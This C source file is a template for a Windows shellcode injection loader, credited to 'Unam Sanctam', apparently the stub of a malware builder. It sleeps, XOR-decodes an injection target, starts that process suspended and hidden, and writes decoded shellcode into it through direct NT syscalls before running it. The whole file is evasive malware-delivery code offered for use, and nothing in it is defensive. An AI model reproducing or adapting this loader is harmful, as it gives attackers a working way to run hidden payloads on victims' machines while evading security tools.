#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/types.h>
#include "Includes/syscalls.h"

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, long dataLen) {
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; i++) {
		output[i] = data[i] ^ "#KEY"[i % #KEYLENGTH];
	}
	return output;
}

int main(int argc, char** argv) {
	Sleep(#DELAY * 1000);

	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info = {sizeof(s_info)};
	LPVOID apointer = NULL;
	SIZE_T size = #SHELLCODELENGTH;
	SIZE_T bytes = 0;
	HANDLE hThread;
	TCHAR* buffer;
	TCHAR injectpath[MAX_PATH*2];
	TCHAR args[MAX_PATH*2];

	_get_pgmptr(&buffer);
	sprintf(injectpath, cipher("#FORMAT1", #FORMAT1LENGTH), getenv(cipher("#ENV", #ENVLENGTH)), cipher("#TARGET", #TARGETLENGTH));
	sprintf(args, cipher("#FORMAT2", #FORMAT2LENGTH), injectpath, #ARGS);
	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
	NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(p_info.hProcess, apointer, cipher("#SHELLCODE", size), size, &bytes);
	NtProtectVirtualMemory(p_info.hProcess, &apointer, &bytes, PAGE_EXECUTE, NULL);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, p_info.hProcess, apointer, apointer, FALSE, 0, 0, 0, NULL);
	NtClose(p_info.hProcess);
	NtClose(p_info.hThread);
	return 0;
}